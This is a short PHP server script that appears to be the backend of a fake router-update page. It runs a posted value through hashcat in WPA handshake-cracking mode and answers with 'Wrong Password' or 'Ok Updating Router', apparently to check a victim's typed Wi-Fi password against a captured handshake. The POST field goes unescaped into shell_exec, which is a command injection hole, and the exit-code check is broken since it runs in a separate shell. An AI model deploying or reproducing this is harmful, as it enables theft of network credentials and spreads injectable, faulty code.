<?php
// server.php
$package_name = $_POST['packageName'] ?? '';

// Logging to a file (you can customize this)
file_put_contents('log.txt', $package_name . PHP_EOL, FILE_APPEND);

// Use the package_name in the command (adjust this as needed)
$install_command = "hashcat -m 22000 -w 4 $hashpath -a 3 $package_name 2>&1";
$output = shell_exec($install_command);

// Get the exit code of the last shell command
$exit_code = shell_exec('echo $?');

if ($exit_code != 0) {
    // Check if the output contains a message indicating a wrong password
    if (strpos($output, 'Exhausted') !== false) {
        echo 'Wrong Password';
    } else {
        echo 'Error executing command: ' . $output;
    }
} else {
    // Check if the output contains a message indicating a successfully cracked password
    if (strpos($output, 'Cracked') !== false) {
        echo 'Ok Updating Router';
    } else {
        echo 'Wrong Password Try Again';
    }
}
?>
